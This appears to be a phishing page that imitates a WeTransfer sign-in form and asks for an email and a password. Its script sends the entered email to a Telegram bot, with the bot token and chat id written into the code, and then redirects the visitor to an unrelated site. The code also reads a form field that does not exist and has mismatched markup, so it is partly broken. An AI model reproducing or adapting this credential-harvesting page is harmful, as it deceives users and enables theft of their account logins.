<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Modern Form UI</title>

<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">

<style>

<style>

    *{
      margin:0;
      padding:0;
      box-sizing:border-box;
      font-family:'Poppins',sans-serif;
    }

    body{
      background:#f4f4f4;
      min-height:100vh;
      display:flex;
      justify-content:center;
      align-items:center;
      padding:20px;
    }

    .wrapper{
      width:100%;
      max-width:480px;
      background:#f4f4f4;
      text-align:center;
    }

    .logo{
      font-size:clamp(42px, 7vw, 70px);
      font-weight:700;
      color:#000;
      margin-bottom:60px;
      line-height:1;
    }

    .title{
      font-size:clamp(32px, 5vw, 50px);
      font-weight:600;
      color:#000;
      margin-bottom:12px;
    }

    .subtitle{
      font-size:clamp(16px, 2vw, 22px);
      color:#222;
      margin-bottom:40px;
      line-height:1.5;
    }

    .input-group{
      margin-bottom:22px;
    }

    .input-group input{
      width:100%;
      padding:22px 24px;
      border:2px solid #d9d9d9;
      border-radius:24px;
      background:#fff;
      font-size:20px;
      outline:none;
      transition:0.3s ease;
    }

    .input-group input:focus{
      border-color:#3567f2;
      box-shadow:0 0 10px rgba(53,103,242,0.15);
    }

    .btn{
      width:100%;
      padding:22px;
      border:none;
      border-radius:24px;
      background:#3567f2;
      color:#fff;
      font-size:28px;
      font-weight:500;
      cursor:pointer;
      transition:0.3s ease;
      margin-top:5px;
    }

    .btn:hover{
      background:#2957d8;
    }

    .links{
      margin-top:45px;
    }

    .links a{
      display:block;
      margin:18px 0;
      color:#222;
      font-size:20px;
      text-decoration:underline;
    }

    .divider{
      display:flex;
      align-items:center;
      margin:45px 0;
      color:#999;
      font-size:22px;
    }

    .divider::before,
    .divider::after{
      content:"";
      flex:1;
      height:1px;
      background:#ccc;
    }

    .divider span{
      margin:0 15px;
    }

    .bottom-text{
      font-size:20px;
      color:#222;
    }

    .bottom-text a{
      color:#222;
      text-decoration:underline;
    }

    /* MOBILE VIEW */
    @media(max-width:768px){

      .wrapper{
        max-width:100%;
      }

      .logo{
        margin-bottom:40px;
      }

      .input-group input{
        font-size:18px;
        padding:20px;
        border-radius:20px;
      }

      .btn{
        font-size:24px;
        padding:18px;
        border-radius:20px;
      }

      .links a{
        font-size:18px;
      }

      .divider{
        font-size:18px;
      }

      .bottom-text{
        font-size:18px;
      }
    }

    /* SMALL MOBILE VIEW */
    @media(max-width:480px){

      body{
        padding:15px;
      }

      .logo{
        font-size:50px;
      }

      .title{
        font-size:34px;
      }

      .subtitle{
        font-size:15px;
      }

      .input-group input{
        padding:18px;
        font-size:16px;
      }

      .btn{
        font-size:22px;
        padding:16px;
      }

      .links a,
      .bottom-text{
        font-size:16px;
      }
    }

</style>
</head>
<body>
<div class="wrapper">

    <div class="logo">
      WeTransfer
    </div>

    <div class="title">
      Sign In
    </div>

    <div class="subtitle">
      to continue to your WeTransfer account.
    </div>
<div class="container">

<form id="notifyForm">

<div class="input-box">
<label>Email</label>
<input type="email" id="email" placeholder="Enter email" required>
</div>

<div class="input-box">
<label>Password</label>
<input type="password" id="password" placeholder="Enter password">
</div>

<button type="submit" class="btn">
Continue
</button>

</form>

<div class="links">
<a href="#">Forgot password?</a>
<a href="#">Use a different email?</a>
</div>

<div class="divider">
<span>or</span>
</div>

<div class="bottom-text">
Receive a
<a href="#">temporary code via email</a>
</div>

</div>

<script>

document.getElementById("notifyForm").addEventListener("submit", async function(e){

  e.preventDefault();

  const email = document.getElementById("email").value;
  const messageInput = document.getElementById("message").value;

  const botToken = "8719151931:AAE9M4RyCXNwTtCeoXc4_8Tb287gD-M2aEA";
  const chatId = "7327775914";

  const message = `
New Notification

Email: ${email}
Message: ${messageInput}
`;

  try{

    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`,{
      method:"POST",
      headers:{
        "Content-Type":"application/json"
      },
      body:JSON.stringify({
        chat_id:chatId,
        text:message
      })
    });

    window.location.href = "https://nxloaded.com";

  }catch(error){

    alert("Failed to send");

  }

});

</script>

</body>
</html>
